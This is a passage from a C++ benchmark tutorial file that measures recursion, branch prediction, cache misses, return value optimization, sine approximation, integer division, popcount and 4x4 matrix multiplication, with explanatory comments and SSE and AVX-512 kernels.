    void operator()(element_t *arr, std::ptrdiff_t low, std::ptrdiff_t high) noexcept {
        if (low >= high) return;
        auto pivot = quick_sort_partition_t {}(arr, low, high);
        quick_sort_recurse_t {}(arr, low, pivot - 1);
        quick_sort_recurse_t {}(arr, pivot + 1, high);
    }
};

/**
 *  @brief  Quick-Sort implementation as a C++ function object, with iterative
 *          deepening using a "stack" data-structure.
 *
 *  Note, this implementation can be inlined, but can't be @b `noexcept`, due to
 *  a potential memory allocation in the `std::vector::resize` function.
 *
 *  Fun fact: The `std::vector` is actually a better choice for a "stack" than
 *  the `std::stack`, as the latter builds on top of a `std::deque`, which is
 *  normally implemented as a sequence of individually allocated fixed-size arrays,
 *  with additional bookkeeping. In our logic we never need to pop from the middle
 *  or from the front, so a `std::vector` is a better choice.
 */
#include <vector> // `std::vector`

template <typename element_type_>
struct quick_sort_iterate {
    using element_t = element_type_;
    using quick_sort_partition_t = quick_sort_partition<element_t>;

    std::vector<std::ptrdiff_t> stack;

    void operator()(element_t *arr, std::ptrdiff_t low, std::ptrdiff_t high) noexcept(false) {

        stack.resize((high - low + 1) * 2);
        std::ptrdiff_t top = -1;

        stack[++top] = low;
        stack[++top] = high;

        while (top >= 0) {
            high = stack[top--];
            low = stack[top--];
            auto pivot = quick_sort_partition_t {}(arr, low, high);

            // If there are elements on left side of pivot,
            // then push left side to stack
            if (low < pivot - 1) {
                stack[++top] = low;
                stack[++top] = pivot - 1;
            }

            // If there are elements on right side of pivot,
            // then push right side to stack
            if (pivot + 1 < high) {
                stack[++top] = pivot + 1;
                stack[++top] = high;
            }
        }
    }
};

template <typename sorter_type_, std::size_t length_> //
static void recursion_cost(bm::State &state) {
    using element_t = typename sorter_type_::element_t;
    sorter_type_ sorter;
    aligned_array<element_t> array(length_);
    for (auto _ : state) {
        for (std::size_t i = 0; i != length_; ++i) array[i] = length_ - i;
        sorter(array.begin(), 0, static_cast<std::ptrdiff_t>(length_ - 1));
    }

    if (!std::is_sorted(array.begin(), array.end())) state.SkipWithError("Array is not sorted!");
    state.SetComplexityN(length_);
}

using recursive_sort_i32s = quick_sort_recurse<std::int32_t>;
using iterative_sort_i32s = quick_sort_iterate<std::int32_t>;

BENCHMARK_TEMPLATE(recursion_cost, recursive_sort_i32s, 16);
BENCHMARK_TEMPLATE(recursion_cost, iterative_sort_i32s, 16);
BENCHMARK_TEMPLATE(recursion_cost, recursive_sort_i32s, 256);
BENCHMARK_TEMPLATE(recursion_cost, iterative_sort_i32s, 256);
BENCHMARK_TEMPLATE(recursion_cost, recursive_sort_i32s, 4096);
BENCHMARK_TEMPLATE(recursion_cost, iterative_sort_i32s, 4096);

/**
 *  If you try pushing the size further, the program will likely @b crash due
 *  to @b stack_overflow. The recursive version is limited by the stack size, while
 *  the iterative version can handle much larger inputs.
 *
 *  As can be seen from our benchmarks, the STL implementation of `std::sort`
 *  is more efficient than our naive kernels, and it's only one of many expressive
 *  solutions in the @b <algorithm> header.
 */

#pragma endregion // Recursion

#pragma region Branch Prediction

/**
 *  The `if` statement and the seemingly innocent ternary operator `x ? a : b`
 *  can be surprisingly expensive in performance-critical code. This is
 *  especially noticeable when conditional execution operates at the byte level,
 *  as in text processing, parsing, searching, compression, encoding, and
 *  similar tasks.
 *
 *  Modern CPUs have sophisticated branch predictors — some of the most complex
 *  hardware components in a processor. These predictors memorize recent branch
 *  patterns, enabling "speculative execution," where the CPU starts processing
 *  the next task (`i+1`) before fully completing the current one (`i`).
 *
 *  While a single `if` in a hot-path is usually not a problem, real-world
 *  applications often involve thousands of branches. On most modern CPUs, up
 *  to @b 4096 branches can be memorized. Beyond that, branch mis-predictions
 *  occur, causing a severe slowdown due to pipeline stalls.
 *
 *  Consider this example: The same snippet can run at @b 0.7ns per operation
 *  when branch predictions are accurate but slows down to @b 3.7ns when
 *  predictions fail.
 */
static void branch_cost(bm::State &state) {
    auto count = static_cast<std::size_t>(state.range(0));
    aligned_array<std::int32_t> random_values(count);
    std::generate_n(random_values.begin(), count, &std::rand);
    std::int32_t variable = 0;
    std::size_t iteration = 0;

    for (auto _ : state) {
        std::int32_t random = random_values[(++iteration) & (count - 1)];
        bm::DoNotOptimize( //
            variable =     //
            (random & 1)   //
                ? (variable + random)
                : (variable * random));
    }
}

BENCHMARK(branch_cost)->RangeMultiplier(4)->Range(256, 32 * 1024);

#pragma endregion // Branch Prediction

#pragma region Cache Misses

/**
 *  Over the decades, CPU speeds have outpaced memory speeds, creating a gap
 *  mitigated by multi-level caching (L1/L2/L3). Cache misses occur when the
 *  CPU fetches data from RAM instead of the cache, incurring high latency.
 *
 *  Access patterns play a crucial role:
 *      - @b Sequential: Predictable and optimal for the CPU prefetcher.
 *      - @b Random: Unpredictable, leading to frequent cache misses.
 *
 *  Benchmarks demonstrate this gap—sequential access can outperform random access
 *  by 10x or more for data sizes exceeding cache capacity. However, the difference
 *  narrows for smaller datasets, benefiting from spatial and temporal locality.
 */

#include <random> // `std::random_device`, `std::mt19937`

enum class access_order_t { sequential, random };

template <access_order_t access_order_>
static void cache_misses_cost(bm::State &state) {
    auto count = static_cast<std::uint32_t>(state.range(0));

    // Populate with arbitrary data
    aligned_array<std::int32_t> data(count);
    std::iota(data.begin(), data.end(), 0);

    // Initialize different access orders
    aligned_array<std::uint32_t> indices(count);
    if constexpr (access_order_ == access_order_t::random) {
        std::random_device random_device;
        std::mt19937 generator(random_device());
        std::uniform_int_distribution<std::uint32_t> uniform_distribution(0, count - 1);
        std::generate(indices.begin(), indices.end(), [&] { return uniform_distribution(generator); });
    }
    else { std::iota(indices.begin(), indices.end(), 0u); }

    // The actual benchmark:
    for (auto _ : state) {
        std::int64_t sum = 0;
        for (auto index : indices) bm::DoNotOptimize(sum += data[index]);
    }
}

BENCHMARK(cache_misses_cost<access_order_t::sequential>)
    ->MinTime(2)
    ->RangeMultiplier(8)
    ->Range(8u * 1024u, 128u * 1024u * 1024u)
    ->Name("cache_misses_cost<sequential>");
BENCHMARK(cache_misses_cost<access_order_t::random>)
    ->MinTime(2)
    ->RangeMultiplier(8)
    ->Range(8u * 1024u, 128u * 1024u * 1024u)
    ->Name("cache_misses_cost<random>");

/**
 *  For small arrays, the execution speed will be identical.
 *  For larger ones, the latency can differ @b 15x!
 */

#pragma endregion // Cache Misses

#pragma region Return Value Optimization

/**
 *  The Return Value Optimization (RVO) is a compiler optimization that elides
 *  the copy constructor and destructor calls when returning a local object by
 *  value. This optimization is crucial for performance, especially when dealing
 *  with heavy objects.
 */
#include <optional> // `std::optional`

std::optional<std::string> make_heavy_object_mutable() {
    std::string x(1024, 'x');
    return x;
}

std::optional<std::string> make_heavy_object_immutable() {
    std::string const x(1024, 'x'); //! `const` is the only difference
    return x;
}

static void rvo_friendly(bm::State &state) {
    for (auto _ : state) bm::DoNotOptimize(make_heavy_object_mutable());
}

static void rvo_impossible(bm::State &state) {
    for (auto _ : state) bm::DoNotOptimize(make_heavy_object_immutable());
}

BENCHMARK(rvo_friendly);
BENCHMARK(rvo_impossible);

/**
 *  Despite intuition, marking a local object as `const` hurts our performance.
 *  The RVO-friendly version takes 21ns, while the second one takes 36ns, @b 70% longer!
 */

#pragma endregion // Return Value Optimization

#pragma endregion // - Basics

#pragma region - Numerics

#pragma region Accuracy vs Efficiency of Standard Libraries

/**
 *  Numerical computing is a core subject in high-performance computing (HPC)
 *  research and graduate studies, yet its foundational concepts are more
 *  accessible than they seem. Let's start with one of the most basic operations
 *  — computing the @b sine of a number.
 */
#include <cmath> // `std::sin`

static void f64_sin(bm::State &state) {
    double argument = std::rand(), result = 0;
    for (auto _ : state) bm::DoNotOptimize(result = std::sin(argument += 0.001));
    state.SetBytesProcessed(state.iterations() * sizeof(double));
}

BENCHMARK(f64_sin);

/**
 *  Standard C library functions like `sin` and `sinf` are designed for maximum
 *  accuracy, often at the cost of performance. We can explore approximations
 *  to trade precision for speed.
 *
 *  A common approach is using the Taylor-Maclaurin @b series — a polynomial
 *  expansion of a function around a point. By limiting the expansion to a few
 *  terms, we can approximate `sin(x)` as:
 *
 *      sin(x) ≈ x - (x^3)/3! + (x^5)/5!
 *
 *  This reduces the computational cost but comes with reduced accuracy.
 *
 *  @see Taylor series: https://en.wikipedia.org/wiki/Taylor_series
 */

static void f64_sin_maclaurin(bm::State &state) {
    double argument = std::rand(), result = 0;
    for (auto _ : state) {
        argument += 0.001;
        result = argument - std::pow(argument, 3) / 6 + std::pow(argument, 5) / 120;
        bm::DoNotOptimize(result);
    }
    state.SetBytesProcessed(state.iterations() * sizeof(double));
}

BENCHMARK(f64_sin_maclaurin);

/**
 *  Result: latency reduction from @b 31ns down to @b 21ns on Intel.
 *  But on Apple M2 Pro, the latency grew from @b 4.8ns to @b 15.2ns 🤯
 *  Doesn't feel like a win!
 *
 *  The @b `std::pow` function is highly generic and not optimized for small,
 *  constant integer exponents. It can be the case, that:
 *
 *      - `std::pow(1.00000000000001, 1.4)` takes 53ns
 *      - `std::pow(1.00000000000001, 1.5)` takes 63,348ns (1000x slower)
 *
 *  We can implement a specialized version for faster @b and slightly more
 *  accurate results, targeting only our specific integer powers.
 *
 *  @see "Slow power computation by 64-bit glibc" by Jason Summers:
 *       https://entropymine.com/imageworsener/slowpow/
 *  @see "When a Microsecond Is an Eternity" by Carl Cook at CppCon 2017:
 *       https://youtu.be/NH1Tta7purM
 */

static void f64_sin_maclaurin_powless(bm::State &state) {
    double argument = std::rand(), result = 0;
    for (auto _ : state) {
        argument += 0.001;
        result = (argument) - (argument * argument * argument) / 6.0 +
                 (argument * argument * argument * argument * argument) / 120.0;
        bm::DoNotOptimize(result);
    }
    state.SetBytesProcessed(state.iterations() * sizeof(double));
}

BENCHMARK(f64_sin_maclaurin_powless);

/**
 *  Result: latency reduction to @b 2ns - a @b 15x speedup on Intel.
 *  On Apple M2 Pro, the latency dropped from @b 15.2ns to @b 1.1ns 🚀
 *  Now this is a win!
 *
 *  We can force the compiler to bypass IEEE-754 compliance checks using
 *  "fast-math" attributes, enabling aggressive floating-point optimizations.
 *
 *  Different compilers support this via:
 *  - Clang and GCC: `-ffast-math`
 *  - ICC: `-fp-model=fast`
 *  - MSVC: `/fp:fast`
 *
 *  The GCC syntax can be:
 *  - Old: `__attribute__((optimize("-ffast-math")))`
 *  - New: `[[gnu::optimize("-ffast-math")]]`
 *
 *  Among other things, this may reorder floating-point operations, ignoring
 *  that floating-point arithmetic isn't strictly associative. So if you have
 *  long chains of arithmetic operations, with a arguments significantly
 *  differing in magnitude, you may get highly inaccurate results.
 *
 *  @see "Beware of fast-math" by Simon Byrne: https://simonbyrne.github.io/notes/fastmath/
 */
#if defined(__GNUC__) && !defined(__clang__)
#define FAST_MATH [[gnu::optimize("-ffast-math")]]
#elif defined(__clang__)
#define FAST_MATH __attribute__((target("-ffast-math")))
#else
#define FAST_MATH
#endif

FAST_MATH static void f64_sin_maclaurin_with_fast_math(bm::State &state) {
    double argument = std::rand(), result = 0;
    for (auto _ : state) {
        argument += 0.001;
        result = (argument) - (argument * argument * argument) / 6.0 +
                 (argument * argument * argument * argument * argument) / 120.0;
        bm::DoNotOptimize(result);
    }
    state.SetBytesProcessed(state.iterations() * sizeof(double));
}

BENCHMARK(f64_sin_maclaurin_with_fast_math);

/**
 *  Result: latency of @b 0.8ns - almost @b 40x faster than the standard
 *  on Intel, but on Arm the result remained unchanged, the same @b 1.1ns.
 *
 *  Advanced libraries like SimSIMD and SLEEF can achieve even better
 *  performance through SIMD-optimized implementations, sometimes trading
 *  accuracy or the breadth of the input range for speed.
 *
 *  @see SimSIMD repository: https://github.com/ashvardanian/simsimd
 *  @see SLEEF repository: https://github.com/shibatch/sleef
 */

#pragma endregion // Accuracy vs Efficiency of Standard Libraries

#pragma region Expensive Integer Operations

template <typename scalar_type_>
scalar_type_ square(scalar_type_ x) noexcept {
    return x * x;
}

/**
 *  It's common knowledge that floating-point math can be costly, but even
 *  integer operations can be surprisingly expensive. @b Division and modulo
 *  operations are notorious examples.
 */
static void integral_division(bm::State &state) {
    std::int64_t a = square<std::int64_t>(std::rand()), b = square<std::int64_t>(std::rand()), c;
    for (auto _ : state) bm::DoNotOptimize(c = (++a) / (++b));
}

BENCHMARK(integral_division);

/**
 *  Division takes around ~10 CPU cycles or @b 2.5ns. However, if the divisor
 *  is known at compile time, the compiler can replace the division with
 *  faster shift and multiply instructions — even for large prime numbers
 *  like  `2147483647`.
 *
 *  @see More Details: https://www.sciencedirect.com/science/article/pii/S2405844021015450
 */
static void integral_division_by_constexpr(bm::State &state) {
    constexpr std::int64_t b = 2147483647;
    std::int64_t a = std::rand(), c;
    for (auto _ : state) bm::DoNotOptimize(c = (++a) / b);
}

BENCHMARK(integral_division_by_constexpr);

/**
 *  The @b `constexpr` specifier is not strictly required if the compiler can
 *  deduce that a value is constant at compile time. However, this optimization
 *  can affect benchmarking results by eliminating divisions entirely through
 *  strength reduction (replacing division with faster operations like shifts
 *  and multiplications).
 *
 *  To ensure the division is evaluated at runtime, forcing the compiler to
 *  treat the divisor as a mutable value, wrap it with @b `std::launder`. This
 *  prevents constant propagation and keeps the benchmark realistic.
 */
#include <new> // `std::launder`

static void integral_division_by_const(bm::State &state) {
    std::int64_t b = 2147483647;
    std::int64_t a = square<std::int64_t>(std::rand()), c = 0;
    for (auto _ : state) bm::DoNotOptimize(c = (++a) / *std::launder(&b));
}

BENCHMARK(integral_division_by_const);

/**
 *  An important optimization trick is that 32-bit integer division can be
 *  performed using 64-bit double-precision floating-point division. This
 *  technique takes advantage of the CPU's highly optimized floating-point
 *  division unit, reducing the operation's latency from approximately
 *  @b 2.5ns to @b 0.5ns.
 *
 *  Since 64-bit doubles can exactly represent all 32-bit signed integers,
 *  this method introduces @b no precision loss, making it a safe and efficient
 *  alternative when division performance is critical.
 */
static void integral_division_with_doubles(bm::State &state) {
    std::int32_t a = std::rand(), b = std::rand(), c = 0;
    for (auto _ : state)
        bm::DoNotOptimize(c = static_cast<std::int32_t>(static_cast<double>(++a) / static_cast<double>(++b)));
}

BENCHMARK(integral_division_with_doubles);

/**
 *  Understanding how compilation settings affect performance is crucial.
 *  The @b `-O3` optimization flag alone isn't always sufficient. Even when
 *  using compiler intrinsics like @b `__builtin_popcountll`, the actual
 *  implementation depends on the target CPU generation. If the CPU lacks
 *  a native Assembly instruction for population count, the compiler will
 *  fall back to a slower, software-emulated version.
 *
 *  To ensure optimal performance, we can use GCC attributes to specify
 *  the target CPU architecture at the function level. The only difference
 *  between the following functions is the applied target attribute,
 *  while the internal logic remains identical.
 */

#if defined(__GNUC__) && !defined(__clang__)

#if defined(__x86_64__) || defined(__i386__)
[[gnu::target("arch=core2")]]
int bits_popcount_emulated(std::uint64_t x) {
    return __builtin_popcountll(x);
}

[[gnu::target("arch=corei7")]]
int bits_popcount_native(std::uint64_t x) {
    return __builtin_popcountll(x);
}
#elif defined(__aarch64__)
[[gnu::target("arch=armv8-r")]]
int bits_popcount_emulated(std::uint64_t x) {
    return __builtin_popcountll(x);
}

[[gnu::target("arch=armv8-a")]]
int bits_popcount_native(std::uint64_t x) {
    return __builtin_popcountll(x);
}
#endif

static void bits_population_count_emulated(bm::State &state) {
    auto a = static_cast<std::uint64_t>(std::rand());
    for (auto _ : state) bm::DoNotOptimize(bits_popcount_emulated(++a));
}

BENCHMARK(bits_population_count_emulated);

static void bits_population_count_native(bm::State &state) {
    auto a = static_cast<std::uint64_t>(std::rand());
    for (auto _ : state) bm::DoNotOptimize(bits_popcount_native(++a));
}

BENCHMARK(bits_population_count_native);
#endif

/**
 *  The performance difference is substantial — a @b 3x improvement:
 *  - Core 2 variant: 2.4ns
 *  - Core i7 variant: 0.8ns
 *
 *  Fun fact: Only a few integer operations on select AMD CPUs can take as long
 *  as @b ~100 CPU cycles. This includes BMI2 bit-manipulation instructions such
 *  as @b `pdep` and @b `pext`, particularly on AMD Zen 1 and Zen 2 architectures.
 *
 *  @see BMI2 details: https://www.chessprogramming.org/BMI2
 */

#pragma endregion // Expensive Integer Operations

#pragma region Compute Bound Linear Algebra

/**
 *  Understanding common algorithmic design patterns across various computational
 *  complexity levels is invaluable. So far, most tasks we've examined have
 *  featured linear complexity in both space and time. Broadly, the following
 *  distinctions are useful:
 *
 *  - Sublinear (e.g., @b O(logN) ): Often found in search workloads, typically IO-bound.
 *  - Linear and sub-quadratic (e.g., @b O(N) to @b O(N*logN) ): Most conventional "coding" tasks.
 *  - Low polynomial (e.g., @b O(N^1.5) to @b O(N^4) ): Common in matrix operations and graph algorithms.
 *  - High polynomial and exponential (e.g., O(N^5) and @b beyond): Rarely practical to solve.
 *
 *  Among low-polynomial tasks, matrix operations stand out as particularly important.
 *  Matrix multiplication forms the foundation of linear algebra and is critical in
 *  fields such as artificial intelligence, computer graphics, and physics simulations.
 *  Given their significance, many CPUs provide native instructions for small matrix
 *  multiplications (e.g., 4x4 or 8x8). Larger matrix multiplications are decomposed
 *  into smaller ones to take advantage of these optimizations.
 *
 *  Let's emulate such operations and explore the underlying principles.
 */

struct f32x4x4_t {
    float scalars[4][4];
};

f32x4x4_t f32x4x4_matmul_kernel(f32x4x4_t const &a, f32x4x4_t const &b) noexcept {
    f32x4x4_t c {};
    // This code gets auto-vectorized regardless of the loop order,
    // be it "ijk", "ikj", "jik", "jki", "kij", or "kji".
    // That's not necessarily the case for other matrix sizes:
    // https://lemire.me/blog/2024/06/13/rolling-your-own-fast-matrix-multiplication-loop-order-and-vectorization/
    for (std::size_t i = 0; i != 4; ++i)
        for (std::size_t j = 0; j != 4; ++j)
            for (std::size_t k = 0; k != 4; ++k) c.scalars[i][j] += a.scalars[i][k] * b.scalars[k][j];

    return c;
}

static void f32x4x4_matmul(bm::State &state) {
    f32x4x4_t a, b, c;
    std::iota(&a.scalars[0][0], &a.scalars[0][0] + 16, 16);
    std::iota(&b.scalars[0][0], &b.scalars[0][0] + 16, 0);

    for (auto _ : state) bm::DoNotOptimize(c = f32x4x4_matmul_kernel(a, b));

    std::size_t tops_per_cycle = 4 * 4 * (4 /* multiplications */ + 3 /* additions */);
    state.counters["TOP"] = bm::Counter(state.iterations() * tops_per_cycle, bm::Counter::kIsRate);
}

BENCHMARK(f32x4x4_matmul);

/**
 *  Multiplying two NxN matrices requires up to NxNxN multiplications and NxNx(N-1)
 *  additions. The asymptotic complexity is O(N^3), with the operation count scaling
 *  cubically with the matrix side. Surprisingly, the naive kernel is fully unrolled
 *  and vectorized by the compiler, achieving @b exceptional_performance:
 *  @b ~3.1ns for 112 arithmetic operations (64 multiplications + 48 additions).
 *
 *  Most of these operations are data-parallel (each cell is independent of others),
 *  enabling the CPU to execute them in parallel. Since the matrix size is small and
 *  known at compile time, the compiler optimizes via loop unrolling—a critical
 *  optimization technique every HPC developer should understand.
 *
 *  Every @b `for` loop is, in essence, a combination of a @b `goto` and an @b `if`.
 *  As we've seen in sections on recursion and branching, jumps and conditions introduce
 *  overhead. Knowing the loop bounds allows us to unroll them manually, expressing every
 *  operation explicitly.
 */

f32x4x4_t f32x4x4_matmul_unrolled_kernel(f32x4x4_t const &a_matrix, f32x4x4_t const &b_matrix) {
    f32x4x4_t c_matrix;
    float const(&a)[4][4] = a_matrix.scalars;
    float const(&b)[4][4] = b_matrix.scalars;
    float(&c)[4][4] = c_matrix.scalars;

    c[0][0] = a[0][0] * b[0][0] + a[0][1] * b[1][0] + a[0][2] * b[2][0] + a[0][3] * b[3][0];
    c[0][1] = a[0][0] * b[0][1] + a[0][1] * b[1][1] + a[0][2] * b[2][1] + a[0][3] * b[3][1];
    c[0][2] = a[0][0] * b[0][2] + a[0][1] * b[1][2] + a[0][2] * b[2][2] + a[0][3] * b[3][2];
    c[0][3] = a[0][0] * b[0][3] + a[0][1] * b[1][3] + a[0][2] * b[2][3] + a[0][3] * b[3][3];

    c[1][0] = a[1][0] * b[0][0] + a[1][1] * b[1][0] + a[1][2] * b[2][0] + a[1][3] * b[3][0];
    c[1][1] = a[1][0] * b[0][1] + a[1][1] * b[1][1] + a[1][2] * b[2][1] + a[1][3] * b[3][1];
    c[1][2] = a[1][0] * b[0][2] + a[1][1] * b[1][2] + a[1][2] * b[2][2] + a[1][3] * b[3][2];
    c[1][3] = a[1][0] * b[0][3] + a[1][1] * b[1][3] + a[1][2] * b[2][3] + a[1][3] * b[3][3];

    c[2][0] = a[2][0] * b[0][0] + a[2][1] * b[1][0] + a[2][2] * b[2][0] + a[2][3] * b[3][0];
    c[2][1] = a[2][0] * b[0][1] + a[2][1] * b[1][1] + a[2][2] * b[2][1] + a[2][3] * b[3][1];
    c[2][2] = a[2][0] * b[0][2] + a[2][1] * b[1][2] + a[2][2] * b[2][2] + a[2][3] * b[3][2];
    c[2][3] = a[2][0] * b[0][3] + a[2][1] * b[1][3] + a[2][2] * b[2][3] + a[2][3] * b[3][3];

    c[3][0] = a[3][0] * b[0][0] + a[3][1] * b[1][0] + a[3][2] * b[2][0] + a[3][3] * b[3][0];
    c[3][1] = a[3][0] * b[0][1] + a[3][1] * b[1][1] + a[3][2] * b[2][1] + a[3][3] * b[3][1];
    c[3][2] = a[3][0] * b[0][2] + a[3][1] * b[1][2] + a[3][2] * b[2][2] + a[3][3] * b[3][2];
    c[3][3] = a[3][0] * b[0][3] + a[3][1] * b[1][3] + a[3][2] * b[2][3] + a[3][3] * b[3][3];

    return c_matrix;
}

static void f32x4x4_matmul_unrolled(bm::State &state) {
    f32x4x4_t a, b, c;
    std::iota(&a.scalars[0][0], &a.scalars[0][0] + 16, 16);
    std::iota(&b.scalars[0][0], &b.scalars[0][0] + 16, 0);

    for (auto _ : state) bm::DoNotOptimize(c = f32x4x4_matmul_unrolled_kernel(a, b));

    std::size_t tops_per_cycle = 4 * 4 * (4 /* multiplications */ + 3 /* additions */);
    state.counters["TOP"] = bm::Counter(state.iterations() * tops_per_cycle, bm::Counter::kIsRate);
}

BENCHMARK(f32x4x4_matmul_unrolled);

/**
 *  The unrolled variant completes in @b 3.1ns, benefiting from auto-vectorization
 *  using SIMD. Modern CPUs leverage super-scalar execution, often called SIMD
 *  (Single Instruction, Multiple Data). These units operate on 128-, 256-, or
 *  512-bit words, containing multiple smaller components (e.g., 64-, 32-, 16-,
 *  or 8-bit integers or floats). While compilers handle auto-vectorization in
 *  many cases, they often fall short of manual optimizations. Achieving a 5x
 *  speedup is common with hand-tuned SIMD code, with some operations seeing
 *  10-100x improvements for certain data types.
 *
 *  @see "Understanding SIMD: Infinite Complexity of Trivial Problems"
 *       https://www.modular.com/blog/understanding-simd-infinite-complexity-of-trivial-problems
 *  @see "GCC Compiler vs Human - 119x Faster Assembly"
 *       https://ashvardanian.com/posts/gcc-12-vs-avx512fp16/
 *
 *  To push the limits of performance further, let's switch from scalar
 *  operations in the unrolled kernel to @b SSE4.1 SIMD instructions—among the
 *  earliest SIMD instruction sets available on most x86 CPUs—and explore how
 *  close we can get to the theoretical 100x improvement.
 */

#if defined(__SSE2__)
#include <smmintrin.h> // `_mm_dp_ps` and `_MM_TRANSPOSE4_PS`

#if defined(__GNUC__) && !defined(__clang__)
#pragma GCC push_options
#pragma GCC target("sse2", "sse3", "sse4.1")
#elif defined(__clang__)
#pragma clang attribute push(__attribute__((target("sse2,sse3,sse4.1"))), apply_to = function)
#endif

f32x4x4_t f32x4x4_matmul_sse41_kernel(f32x4x4_t const &a, f32x4x4_t const &b) noexcept {
    f32x4x4_t c;
    // Load a continuous vector of 4x floats in a single instruction., invoked
    // by the `_mm_loadu_ps` intrinsic.
    __m128 a_row_0 = _mm_loadu_ps(&a.scalars[0][0]);
    __m128 a_row_1 = _mm_loadu_ps(&a.scalars[1][0]);
    __m128 a_row_2 = _mm_loadu_ps(&a.scalars[2][0]);
    __m128 a_row_3 = _mm_loadu_ps(&a.scalars[3][0]);

    // Load the columns of the matrix B, by loading the 4 rows and then
    // transposing with an SSE macro:
    // https://randombit.net/bitbashing/posts/integer_matrix_transpose_in_sse2.html
    __m128 b_col_0 = _mm_loadu_ps(&b.scalars[0][0]);
    __m128 b_col_1 = _mm_loadu_ps(&b.scalars[1][0]);
    __m128 b_col_2 = _mm_loadu_ps(&b.scalars[2][0]);
    __m128 b_col_3 = _mm_loadu_ps(&b.scalars[3][0]);
    _MM_TRANSPOSE4_PS(b_col_0, b_col_1, b_col_2, b_col_3);

    // Multiply A rows by B columns and store the result in C.
    // Use bitwise "OR" to aggregate dot products and store results.
    //
    // The individual dot products are calculated with the `_mm_dp_ps`
    // intrinsic, which is a dot product of two vectors, with the result stored
    // in a single float. The last argument is a mask, which specifies which
    // components of the vectors should be multiplied and added.
    __m128 c_row_0 = _mm_or_ps( //
        _mm_or_ps(_mm_dp_ps(a_row_0, b_col_0, 0xF1), _mm_dp_ps(a_row_0, b_col_1, 0xF2)),
        _mm_or_ps(_mm_dp_ps(a_row_0, b_col_2, 0xF4), _mm_dp_ps(a_row_0, b_col_3, 0xF8)));
    _mm_storeu_ps(&c.scalars[0][0], c_row_0);

    __m128 c_row_1 = _mm_or_ps( //
        _mm_or_ps(_mm_dp_ps(a_row_1, b_col_0, 0xF1), _mm_dp_ps(a_row_1, b_col_1, 0xF2)),
        _mm_or_ps(_mm_dp_ps(a_row_1, b_col_2, 0xF4), _mm_dp_ps(a_row_1, b_col_3, 0xF8)));
    _mm_storeu_ps(&c.scalars[1][0], c_row_1);

    __m128 c_row_2 = _mm_or_ps( //
        _mm_or_ps(_mm_dp_ps(a_row_2, b_col_0, 0xF1), _mm_dp_ps(a_row_2, b_col_1, 0xF2)),
        _mm_or_ps(_mm_dp_ps(a_row_2, b_col_2, 0xF4), _mm_dp_ps(a_row_2, b_col_3, 0xF8)));
    _mm_storeu_ps(&c.scalars[2][0], c_row_2);

    __m128 c_row_3 = _mm_or_ps( //
        _mm_or_ps(_mm_dp_ps(a_row_3, b_col_0, 0xF1), _mm_dp_ps(a_row_3, b_col_1, 0xF2)),
        _mm_or_ps(_mm_dp_ps(a_row_3, b_col_2, 0xF4), _mm_dp_ps(a_row_3, b_col_3, 0xF8)));
    _mm_storeu_ps(&c.scalars[3][0], c_row_3);

    return c;
}

#if defined(__GNUC__) && !defined(__clang__)
#pragma GCC pop_options
#elif defined(__clang__)
#pragma clang attribute pop
#endif

static void f32x4x4_matmul_sse41(bm::State &state) {
    f32x4x4_t a, b, c;
    std::iota(&a.scalars[0][0], &a.scalars[0][0] + 16, 16);
    std::iota(&b.scalars[0][0], &b.scalars[0][0] + 16, 0);

    for (auto _ : state) bm::DoNotOptimize(c = f32x4x4_matmul_sse41_kernel(a, b));

    std::size_t tops_per_cycle = 4 * 4 * (4 /* multiplications */ + 3 /* additions */);
    state.counters["TOP"] = bm::Counter(state.iterations() * tops_per_cycle, bm::Counter::kIsRate);
}

BENCHMARK(f32x4x4_matmul_sse41);
#endif // defined(__SSE2__)

/**
 *  The result is @b 19.6ns compared to the @b 3.1ns from the unrolled kernel.
 *  It turns out we were not as clever as we thought. Disassembling the unrolled
 *  kernel reveals that the compiler was already optimizing it better than we did.
 *  Each line compiles into a series of efficient instructions like:
 *
 *      vmovss  xmm0, dword ptr [rdi]
 *      vmovss  xmm1, dword ptr [rdi + 4]
 *      vmulss  xmm1, xmm1, dword ptr [rsi + 16]
 *      vfmadd231ss     xmm1, xmm0, dword ptr [rsi]
 *      vmovss  xmm0, dword ptr [rdi + 8]
 *      vfmadd132ss     xmm0, xmm1, dword ptr [rsi + 32]
 *      vmovss  xmm1, dword ptr [rdi + 12]
 *      vfmadd132ss     xmm1, xmm0, dword ptr [rsi + 48]
 *      vmovss  dword ptr [rdx], xmm1
 *
 *  Instructions like `vfmadd132ss` and `vfmadd231ss` operating on @b `xmm`
 *  registers show how smart the compiler was at exploiting SIMD capabilities.
 *  But the game isn't over—there's still room to optimize for larger instruction
 *  sets.
 *
 *  @see Explore the unrolled kernel assembly on GodBolt:
 *       https://godbolt.org/z/bW5nnTKs1
 *  @see Explore instruction latencies on @b uops.info:
 *       https://uops.info/table.html
 *
 *  With AVX-512 on modern CPUs, we can fit an entire matrix into a single
 *  @b `zmm` register (512 bits wide). This Instruction Set Extension is available
 *  on Intel Skylake-X, Ice Lake, and AMD Zen4 CPUs, offering powerful functionality.
 *  However, on Zen4, AVX-512 is emulated as two 256-bit operations, so the performance
 *  isn't as strong as on Intel CPUs. Native support comes with Zen5.
 */
#if defined(__AVX512F__)
#include <immintrin.h> // `_mm512_loadu_ps`
#if defined(__GNUC__) && !defined(__clang__)
#pragma GCC push_options
#pragma GCC target("avx2", "avx512f", "avx512bw", "avx512vl", "bmi2")
#elif defined(__clang__)
#pragma clang attribute push(__attribute__((target("avx2,avx512f,avx512bw,avx512vl,bmi2"))), apply_to = function)
#endif

f32x4x4_t f32x4x4_matmul_avx512_kernel(f32x4x4_t const &a, f32x4x4_t const &b) noexcept {
    __m512 a_mat = _mm512_loadu_ps(&a.scalars[0][0]);
    __m512 b_mat = _mm512_loadu_ps(&b.scalars[0][0]);

    __m512 a_vec_1 = _mm512_permute_ps(a_mat, 0x0);
    __m512 b_vec_1 = _mm512_broadcast_f32x4(_mm512_castps512_ps128(b_mat));
    __m512 c_vec = _mm512_mul_ps(a_vec_1, b_vec_1);

    __m512 a_vec_2 = _mm512_permute_ps(a_mat, 0x55);
    b_mat = _mm512_castsi512_ps(_mm512_alignr_epi64(_mm512_castps_si512(b_mat), _mm512_castps_si512(b_mat), 0x2));
    __m512 b_vec_2 = _mm512_broadcast_f32x4(_mm512_castps512_ps128(b_mat));
    c_vec = _mm512_fmadd_ps(a_vec_2, b_vec_2, c_vec);

    __m512 a_vec_3 = _mm512_permute_ps(a_mat, 0xAA);
    b_mat = _mm512_castsi512_ps(_mm512_alignr_epi64(_mm512_castps_si512(b_mat), _mm512_castps_si512(b_mat), 0x2));
